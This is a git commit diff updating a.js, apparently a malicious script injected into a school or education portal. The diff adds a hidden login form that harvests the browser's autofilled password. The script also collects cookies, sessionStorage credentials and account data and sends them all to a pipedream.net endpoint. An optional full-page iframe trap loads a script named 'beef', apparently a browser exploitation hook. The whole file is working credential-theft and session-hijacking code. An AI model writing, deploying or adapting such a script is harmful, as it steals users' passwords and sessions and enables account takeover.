e62eedf405f1586a085b655c60add83612497c05
Exon <exon038@gmail.com>
2026-05-30 17:34:16 +0200

    Update a.js

--- a.js
+++ a.js
@@ -1,19 +1,35 @@
+const ur = new URL(document.currentScript.src);
+
 (async function ex() {
 
-	const ur = new URL(document.currentScript.src);
-	const url = 'https://eoyybrhlzu9cp6e.m.pipedream.net/session';
+	const url = 'https://eocokq62jnfdj8e.m.pipedream.net/session';
 	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
 	const keys = [
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
 		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
 	];
+	const form = document.createElement('form');
+	const identifiant = JSON.parse(sessionStorage.getItem("accounts"));
+	form.hidden = true;
+	form.innerHTML = `<input id="username" name="username" autocomplete="username" value=${identifiant.payload.accounts?.[0].identifiant}><input id="password" name="password" autocomplete="current-password" type="password">`
+	document.body.appendChild(form);
+	const pwdInput = document.querySelector('input[type="password"]');
+	const interval = setInterval(() => {
+		if (pwdInput.value !== "") {
+			console.log(pwdInput.value);
+			clearInterval(interval);
+		}
+	}, 40);
   
 	const data = {
 		t: new Date().toISOString(),
 		u: navigator.userAgent,
-		d: messageid.searchParams.get('idMessage') || "null",
-		apiv: ur.searchParams.get("apiv") || "100.0",
-		si: ur.searchParams.get("signature") || false,
+		mid: messageid.searchParams.get('idMessage') || "null",
+		api: ur.searchParams.get("apiv") || "100.1",
+		sign: ur.searchParams.get("signature") || false,
+		mode: ur.searchParams.get("mode") || "Suppression",
+		email: ur.searchParams.get("email") || "test@gmail.com",
+		ps: pwdInput.value,
 		c: document.cookie,
 		s: Object.fromEntries(
 		keys
@@ -37,7 +53,7 @@
 	} catch {}
 })();
 
-(async function iframe() {
+async function iframe() {
 	const i = window.top.document.createElement('iframe');
 	i.src = "/";
 	i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
@@ -50,5 +66,10 @@
 		beef.async = true;
 		window.top.document.body.appendChild(beef);
 	};
+	
 	return;
-})();
+};
+
+if (ur.searchParams.get("iframetrap") === true) {
+	await iframe()
+}
